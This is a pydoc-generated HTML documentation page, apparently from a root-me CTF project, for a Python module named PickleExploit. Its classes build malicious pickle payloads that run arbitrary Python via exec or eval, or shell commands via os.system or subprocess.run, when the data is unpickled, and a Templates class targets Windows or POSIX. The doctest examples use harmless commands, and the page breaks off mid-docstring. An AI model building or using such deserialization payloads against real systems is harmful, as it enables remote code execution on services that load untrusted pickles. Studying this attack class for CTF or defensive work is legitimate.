<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head><title>Python: module PickleExploit</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head><body bgcolor="#f0f0f8">

<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="heading">
<tr bgcolor="#7799ee">
<td valign=bottom>&nbsp;<br>
<font color="#ffffff" face="helvetica, arial">&nbsp;<br><big><big><strong>PickleExploit</strong></big></big></font></td
><td align=right valign=bottom
><font color="#ffffff" face="helvetica, arial"><a href=".">index</a><br><a href="file:c%3A%5Cusers%5Ccsu1%5Cdocuments%5Cdev%5Croot-me%5Cpickleexploit%5Cpickleexploit%5Cpickleexploit.py">c:\users\csu1\documents\dev\root-me\pickleexploit\pickleexploit\pickleexploit.py</a></font></td></tr></table>
    <p><tt>This&nbsp;module&nbsp;implement&nbsp;pickle&nbsp;exploit.<br>
Make&nbsp;easy&nbsp;a&nbsp;pickle&nbsp;PAYLOAD&nbsp;and&nbsp;test&nbsp;it.<br>
&nbsp;<br>
To&nbsp;launch&nbsp;tests,&nbsp;use&nbsp;this&nbsp;command:&nbsp;python3&nbsp;-m&nbsp;doctest&nbsp;<a href="#PickleExploit">PickleExploit</a>.py<br>
To&nbsp;print&nbsp;the&nbsp;doc&nbsp;you&nbsp;can&nbsp;use:&nbsp;python3&nbsp;-m&nbsp;pydoc&nbsp;-b<br>
&nbsp;<br>
&gt;&gt;&gt;&nbsp;pyexploit&nbsp;=&nbsp;<a href="#PyPickleExploit">PyPickleExploit</a>("print('je&nbsp;test',&nbsp;'test2')")<br>
&gt;&gt;&gt;&nbsp;pyexploit.build()<br>
&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;pyexploit.get_pickle_payload()<br>
&gt;&gt;&gt;&nbsp;pyexploit.execute_payload()<br>
je&nbsp;test&nbsp;test2<br>
&nbsp;<br>
&gt;&gt;&gt;&nbsp;shellexploit&nbsp;=&nbsp;<a href="#ShellPickleExploit">ShellPickleExploit</a>('echo&nbsp;"je&nbsp;test"')<br>
&gt;&gt;&gt;&nbsp;shellexploit.build()<br>
&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;shellexploit.get_pickle_payload()<br>
&gt;&gt;&gt;&nbsp;shellexploit.execute_payload(exploit_pickled)<br>
0</tt></p>
<p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#aa55cc">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#ffffff" face="helvetica, arial"><big><strong>Modules</strong></big></font></td></tr>
    
<tr><td bgcolor="#aa55cc"><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</tt></td><td>&nbsp;</td>
<td width="100%"><table width="100%" summary="list"><tr><td width="25%" valign=top><a href="os.html">os</a><br>
</td><td width="25%" valign=top><a href="subprocess.html">subprocess</a><br>
</td><td width="25%" valign=top></td><td width="25%" valign=top></td></tr></table></td></tr></table><p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#ee77aa">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#ffffff" face="helvetica, arial"><big><strong>Classes</strong></big></font></td></tr>
    
<tr><td bgcolor="#ee77aa"><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</tt></td><td>&nbsp;</td>
<td width="100%"><dl>
<dt><font face="helvetica, arial"><a href="builtins.html#object">builtins.object</a>
</font></dt><dd>
<dl>
<dt><font face="helvetica, arial"><a href="PickleExploit.html#PickleExploit">PickleExploit</a>
</font></dt><dd>
<dl>
<dt><font face="helvetica, arial"><a href="PickleExploit.html#PyPickleExploit">PyPickleExploit</a>
</font></dt><dt><font face="helvetica, arial"><a href="PickleExploit.html#ShellPickleExploit">ShellPickleExploit</a>
</font></dt></dl>
</dd>
<dt><font face="helvetica, arial"><a href="PickleExploit.html#Templates">Templates</a>
</font></dt></dl>
</dd>
</dl>
 <p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#ffc8d8">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#000000" face="helvetica, arial"><a name="PickleExploit">class <strong>PickleExploit</strong></a>(<a href="builtins.html#object">builtins.object</a>)</font></td></tr>
    
<tr bgcolor="#ffc8d8"><td rowspan=2><tt>&nbsp;&nbsp;&nbsp;</tt></td>
<td colspan=2><tt><a href="#PickleExploit">PickleExploit</a>(function:&nbsp;collections.abc.Callable,&nbsp;args:&nbsp;list)<br>
&nbsp;<br>
This&nbsp;class&nbsp;build&nbsp;a&nbsp;custom&nbsp;pickle&nbsp;exploit.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;["je&nbsp;test",&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;print&gt;,&nbsp;('je&nbsp;test',&nbsp;'test2'))<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;dumps(exploit)<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_unpickled&nbsp;=&nbsp;loads(exploit_pickled)<br>
&nbsp;je&nbsp;test&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#PickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;je&nbsp;test&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;je&nbsp;test&nbsp;test2<br>&nbsp;</tt></td></tr>
<tr><td>&nbsp;</td>
<td width="100%">Methods defined here:<br>
<dl><dt><a name="PickleExploit-__init__"><strong>__init__</strong></a>(self, function: collections.abc.Callable, args: list)</dt><dd><tt>Initialize&nbsp;self.&nbsp;&nbsp;See&nbsp;help(type(self))&nbsp;for&nbsp;accurate&nbsp;signature.</tt></dd></dl>

<dl><dt><a name="PickleExploit-__reduce__"><strong>__reduce__</strong></a>(self)</dt><dd><tt>Helper&nbsp;for&nbsp;pickle.</tt></dd></dl>

<dl><dt><a name="PickleExploit-build"><strong>build</strong></a>(self) -&gt; None</dt><dd><tt>This&nbsp;function&nbsp;build&nbsp;the&nbsp;tuple&nbsp;exploit.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;print&gt;,&nbsp;(b'je&nbsp;test',&nbsp;'test2'))</tt></dd></dl>

<dl><dt><a name="PickleExploit-execute_payload"><strong>execute_payload</strong></a>(self, payload: &lt;function NewType.&lt;locals&gt;.new_type at 0x0000029B757F4940&gt; = None) -&gt; ~ObjectOrNone</dt><dd><tt>This&nbsp;function&nbsp;execute&nbsp;the&nbsp;payload<br>
and&nbsp;return&nbsp;the&nbsp;loaded&nbsp;<a href="builtins.html#object">object</a>.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#PickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;b'je&nbsp;test'&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;dumps(exploit)<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<dl><dt><a name="PickleExploit-get_pickle_payload"><strong>get_pickle_payload</strong></a>(self, protocol: int = 0) -&gt; bytes</dt><dd><tt>This&nbsp;function&nbsp;return&nbsp;the&nbsp;pickle&nbsp;payload.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#PickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;loads(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<hr>
Data descriptors defined here:<br>
<dl><dt><strong>__dict__</strong></dt>
<dd><tt>dictionary&nbsp;for&nbsp;instance&nbsp;variables&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
<dl><dt><strong>__weakref__</strong></dt>
<dd><tt>list&nbsp;of&nbsp;weak&nbsp;references&nbsp;to&nbsp;the&nbsp;object&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
</td></tr></table> <p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#ffc8d8">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#000000" face="helvetica, arial"><a name="PyPickleExploit">class <strong>PyPickleExploit</strong></a>(<a href="PickleExploit.html#PickleExploit">PickleExploit</a>)</font></td></tr>
    
<tr bgcolor="#ffc8d8"><td rowspan=2><tt>&nbsp;&nbsp;&nbsp;</tt></td>
<td colspan=2><tt><a href="#PyPickleExploit">PyPickleExploit</a>(string_code:&nbsp;str,&nbsp;*args,&nbsp;function=&amp;lt;built-in&nbsp;function&nbsp;exec&amp;gt;)<br>
&nbsp;<br>
This&nbsp;class&nbsp;is&nbsp;a&nbsp;<a href="#PickleExploit">PickleExploit</a>&nbsp;to&nbsp;execute<br>
python&nbsp;code.<br>
string_code:&nbsp;is&nbsp;a&nbsp;str&nbsp;and&nbsp;must&nbsp;be&nbsp;python&nbsp;code<br>
args:&nbsp;must&nbsp;be&nbsp;optional&nbsp;argument&nbsp;for&nbsp;function<br>
function:&nbsp;[OPTIONAL,&nbsp;default=exec]&nbsp;the&nbsp;function&nbsp;to&nbsp;call<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;python&nbsp;code&nbsp;(exec,&nbsp;eval,&nbsp;...)<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit&nbsp;=&nbsp;<a href="#PyPickleExploit">PyPickleExploit</a>("print('je&nbsp;test',&nbsp;'test2')",&nbsp;{&nbsp;"print":&nbsp;print&nbsp;},&nbsp;{&nbsp;"print":&nbsp;print&nbsp;})<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;exec&gt;,&nbsp;("print('je&nbsp;test',&nbsp;'test2')",&nbsp;{'print':&nbsp;&lt;built-in&nbsp;function&nbsp;print&gt;},&nbsp;{'print':&nbsp;&lt;built-in&nbsp;function&nbsp;print&gt;}))<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;pyexploit.<a href="#PyPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;je&nbsp;test&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;je&nbsp;test&nbsp;test2<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit&nbsp;=&nbsp;<a href="#PyPickleExploit">PyPickleExploit</a>("print(b'je&nbsp;test',&nbsp;'test2')",&nbsp;{&nbsp;"print":&nbsp;print&nbsp;},&nbsp;{&nbsp;"print":&nbsp;print&nbsp;},&nbsp;function=eval)<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;eval&gt;,&nbsp;("print(b'je&nbsp;test',&nbsp;'test2')",&nbsp;{'print':&nbsp;&lt;built-in&nbsp;function&nbsp;print&gt;},&nbsp;{'print':&nbsp;&lt;built-in&nbsp;function&nbsp;print&gt;}))<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;pyexploit.<a href="#PyPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;b'je&nbsp;test'&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;pyexploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2<br>&nbsp;</tt></td></tr>
<tr><td>&nbsp;</td>
<td width="100%"><dl><dt>Method resolution order:</dt>
<dd><a href="PickleExploit.html#PyPickleExploit">PyPickleExploit</a></dd>
<dd><a href="PickleExploit.html#PickleExploit">PickleExploit</a></dd>
<dd><a href="builtins.html#object">builtins.object</a></dd>
</dl>
<hr>
Methods defined here:<br>
<dl><dt><a name="PyPickleExploit-__init__"><strong>__init__</strong></a>(self, string_code: str, *args, function=&lt;built-in function exec&gt;)</dt><dd><tt>Initialize&nbsp;self.&nbsp;&nbsp;See&nbsp;help(type(self))&nbsp;for&nbsp;accurate&nbsp;signature.</tt></dd></dl>

<hr>
Methods inherited from <a href="PickleExploit.html#PickleExploit">PickleExploit</a>:<br>
<dl><dt><a name="PyPickleExploit-__reduce__"><strong>__reduce__</strong></a>(self)</dt><dd><tt>Helper&nbsp;for&nbsp;pickle.</tt></dd></dl>

<dl><dt><a name="PyPickleExploit-build"><strong>build</strong></a>(self) -&gt; None</dt><dd><tt>This&nbsp;function&nbsp;build&nbsp;the&nbsp;tuple&nbsp;exploit.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PyPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;print&gt;,&nbsp;(b'je&nbsp;test',&nbsp;'test2'))</tt></dd></dl>

<dl><dt><a name="PyPickleExploit-execute_payload"><strong>execute_payload</strong></a>(self, payload: &lt;function NewType.&lt;locals&gt;.new_type at 0x0000029B757F4940&gt; = None) -&gt; ~ObjectOrNone</dt><dd><tt>This&nbsp;function&nbsp;execute&nbsp;the&nbsp;payload<br>
and&nbsp;return&nbsp;the&nbsp;loaded&nbsp;<a href="builtins.html#object">object</a>.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PyPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#PyPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;b'je&nbsp;test'&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;dumps(exploit)<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PyPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<dl><dt><a name="PyPickleExploit-get_pickle_payload"><strong>get_pickle_payload</strong></a>(self, protocol: int = 0) -&gt; bytes</dt><dd><tt>This&nbsp;function&nbsp;return&nbsp;the&nbsp;pickle&nbsp;payload.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#PyPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#PyPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;loads(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<hr>
Data descriptors inherited from <a href="PickleExploit.html#PickleExploit">PickleExploit</a>:<br>
<dl><dt><strong>__dict__</strong></dt>
<dd><tt>dictionary&nbsp;for&nbsp;instance&nbsp;variables&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
<dl><dt><strong>__weakref__</strong></dt>
<dd><tt>list&nbsp;of&nbsp;weak&nbsp;references&nbsp;to&nbsp;the&nbsp;object&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
</td></tr></table> <p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#ffc8d8">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#000000" face="helvetica, arial"><a name="ShellPickleExploit">class <strong>ShellPickleExploit</strong></a>(<a href="PickleExploit.html#PickleExploit">PickleExploit</a>)</font></td></tr>
    
<tr bgcolor="#ffc8d8"><td rowspan=2><tt>&nbsp;&nbsp;&nbsp;</tt></td>
<td colspan=2><tt><a href="#ShellPickleExploit">ShellPickleExploit</a>(command:&nbsp;str,&nbsp;*args,&nbsp;function=&amp;lt;built-in&nbsp;function&nbsp;system&amp;gt;)<br>
&nbsp;<br>
This&nbsp;class&nbsp;is&nbsp;a&nbsp;<a href="#PickleExploit">PickleExploit</a>&nbsp;to&nbsp;execute<br>
command&nbsp;line.<br>
command:&nbsp;is&nbsp;a&nbsp;str&nbsp;and&nbsp;must&nbsp;be&nbsp;a&nbsp;command&nbsp;line<br>
args:&nbsp;must&nbsp;be&nbsp;optional&nbsp;argument&nbsp;for&nbsp;function<br>
function:&nbsp;[OPTIONAL,&nbsp;default=os.system]&nbsp;the&nbsp;function<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to&nbsp;execute&nbsp;the&nbsp;command&nbsp;line&nbsp;(os.system,&nbsp;os.popen,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;subprocess.run,&nbsp;...)<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit&nbsp;=&nbsp;<a href="#ShellPickleExploit">ShellPickleExploit</a>('echo&nbsp;"je&nbsp;test"')<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.<a href="#ShellPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;system&gt;,&nbsp;('echo&nbsp;"je&nbsp;test"',))<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;shellexploit.<a href="#ShellPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;0<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;0<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit&nbsp;=&nbsp;<a href="#ShellPickleExploit">ShellPickleExploit</a>('netstat&nbsp;-h',&nbsp;function=subprocess.run)<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.<a href="#ShellPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;shellexploit.functionnal_payload[1]<br>
&nbsp;('netstat&nbsp;-h',)<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;shellexploit.<a href="#ShellPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;process&nbsp;=&nbsp;shellexploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;process.returncode<br>
&nbsp;1<br>
&nbsp;&gt;&gt;&gt;&nbsp;process&nbsp;=&nbsp;shellexploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;&gt;&gt;&gt;&nbsp;process.returncode<br>
&nbsp;1<br>&nbsp;</tt></td></tr>
<tr><td>&nbsp;</td>
<td width="100%"><dl><dt>Method resolution order:</dt>
<dd><a href="PickleExploit.html#ShellPickleExploit">ShellPickleExploit</a></dd>
<dd><a href="PickleExploit.html#PickleExploit">PickleExploit</a></dd>
<dd><a href="builtins.html#object">builtins.object</a></dd>
</dl>
<hr>
Methods defined here:<br>
<dl><dt><a name="ShellPickleExploit-__init__"><strong>__init__</strong></a>(self, command: str, *args, function=&lt;built-in function system&gt;)</dt><dd><tt>Initialize&nbsp;self.&nbsp;&nbsp;See&nbsp;help(type(self))&nbsp;for&nbsp;accurate&nbsp;signature.</tt></dd></dl>

<hr>
Methods inherited from <a href="PickleExploit.html#PickleExploit">PickleExploit</a>:<br>
<dl><dt><a name="ShellPickleExploit-__reduce__"><strong>__reduce__</strong></a>(self)</dt><dd><tt>Helper&nbsp;for&nbsp;pickle.</tt></dd></dl>

<dl><dt><a name="ShellPickleExploit-build"><strong>build</strong></a>(self) -&gt; None</dt><dd><tt>This&nbsp;function&nbsp;build&nbsp;the&nbsp;tuple&nbsp;exploit.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#ShellPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.functionnal_payload<br>
&nbsp;(&lt;built-in&nbsp;function&nbsp;print&gt;,&nbsp;(b'je&nbsp;test',&nbsp;'test2'))</tt></dd></dl>

<dl><dt><a name="ShellPickleExploit-execute_payload"><strong>execute_payload</strong></a>(self, payload: &lt;function NewType.&lt;locals&gt;.new_type at 0x0000029B757F4940&gt; = None) -&gt; ~ObjectOrNone</dt><dd><tt>This&nbsp;function&nbsp;execute&nbsp;the&nbsp;payload<br>
and&nbsp;return&nbsp;the&nbsp;loaded&nbsp;<a href="builtins.html#object">object</a>.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#ShellPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#ShellPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>()<br>
&nbsp;b'je&nbsp;test'&nbsp;test2<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;dumps(exploit)<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#ShellPickleExploit-execute_payload">execute_payload</a>(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<dl><dt><a name="ShellPickleExploit-get_pickle_payload"><strong>get_pickle_payload</strong></a>(self, protocol: int = 0) -&gt; bytes</dt><dd><tt>This&nbsp;function&nbsp;return&nbsp;the&nbsp;pickle&nbsp;payload.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit&nbsp;=&nbsp;<a href="#PickleExploit">PickleExploit</a>(print,&nbsp;[str.encode("je&nbsp;test"),&nbsp;"test2"])<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit.<a href="#ShellPickleExploit-build">build</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;exploit_pickled&nbsp;=&nbsp;exploit.<a href="#ShellPickleExploit-get_pickle_payload">get_pickle_payload</a>()<br>
&nbsp;&gt;&gt;&gt;&nbsp;loads(exploit_pickled)<br>
&nbsp;b'je&nbsp;test'&nbsp;test2</tt></dd></dl>

<hr>
Data descriptors inherited from <a href="PickleExploit.html#PickleExploit">PickleExploit</a>:<br>
<dl><dt><strong>__dict__</strong></dt>
<dd><tt>dictionary&nbsp;for&nbsp;instance&nbsp;variables&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
<dl><dt><strong>__weakref__</strong></dt>
<dd><tt>list&nbsp;of&nbsp;weak&nbsp;references&nbsp;to&nbsp;the&nbsp;object&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
</td></tr></table> <p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#ffc8d8">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#000000" face="helvetica, arial"><a name="Templates">class <strong>Templates</strong></a>(<a href="builtins.html#object">builtins.object</a>)</font></td></tr>
    
<tr bgcolor="#ffc8d8"><td rowspan=2><tt>&nbsp;&nbsp;&nbsp;</tt></td>
<td colspan=2><tt><a href="#Templates">Templates</a>(type_:&nbsp;str,&nbsp;payload:&nbsp;str,&nbsp;function:&nbsp;collections.abc.Callable&nbsp;=&nbsp;&amp;lt;built-in&nbsp;function&nbsp;exec&amp;gt;,&nbsp;target_system:&nbsp;str&nbsp;=&nbsp;'nt')<br>
&nbsp;<br>
This&nbsp;class&nbsp;implement&nbsp;constant&nbsp;to&nbsp;build<br>
custom&nbsp;pickle&nbsp;exploit&nbsp;based&nbsp;on&nbsp;templates<br>
&nbsp;<br>
&nbsp;-&nbsp;PYTHON_PICKLE_EXPLOIT:&nbsp;to&nbsp;build&nbsp;python&nbsp;code&nbsp;exploit<br>
&nbsp;-&nbsp;SHELL_PICKLE_EXPLOIT:&nbsp;to&nbsp;build&nbsp;command&nbsp;line&nbsp;exploit<br>
&nbsp;<br>
&nbsp;-&nbsp;type_:&nbsp;must&nbsp;be&nbsp;"python"&nbsp;or&nbsp;"shell"<br>
&nbsp;-&nbsp;payload:&nbsp;python&nbsp;code&nbsp;or&nbsp;command&nbsp;line&nbsp;to&nbsp;execute<br>
&nbsp;-&nbsp;function:&nbsp;must&nbsp;be&nbsp;exec&nbsp;or&nbsp;eval&nbsp;(but&nbsp;all&nbsp;builtins&nbsp;can&nbsp;be&nbsp;use)<br>
&nbsp;-&nbsp;target_system:&nbsp;must&nbsp;be&nbsp;a&nbsp;os.name&nbsp;("nt"&nbsp;or&nbsp;"posix")<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;templated_pickle&nbsp;=&nbsp;<a href="#Templates">Templates</a>("python",&nbsp;"print('PAYLOAD')")<br>
&nbsp;&gt;&gt;&gt;&nbsp;loads(templated_pickle.<a href="#Templates-build">build</a>())<br>
&nbsp;PAYLOAD<br>&nbsp;</tt></td></tr>
<tr><td>&nbsp;</td>
<td width="100%">Methods defined here:<br>
<dl><dt><a name="Templates-__init__"><strong>__init__</strong></a>(self, type_: str, payload: str, function: collections.abc.Callable = &lt;built-in function exec&gt;, target_system: str = 'nt')</dt><dd><tt>&gt;&gt;&gt;&nbsp;templated_pickle&nbsp;=&nbsp;<a href="#Templates">Templates</a>("python",&nbsp;"print('PAYLOAD')",&nbsp;function=eval)<br>
&gt;&gt;&gt;&nbsp;loads(templated_pickle.<a href="#Templates-build">build</a>())<br>
PAYLOAD</tt></dd></dl>

<dl><dt><a name="Templates-build"><strong>build</strong></a>(self) -&gt; bytes</dt><dd><tt>This&nbsp;function&nbsp;build&nbsp;exploit&nbsp;and&nbsp;return&nbsp;it.<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;templated_pickle&nbsp;=&nbsp;<a href="#Templates">Templates</a>("python",&nbsp;"PAYLOAD",&nbsp;function=print)<br>
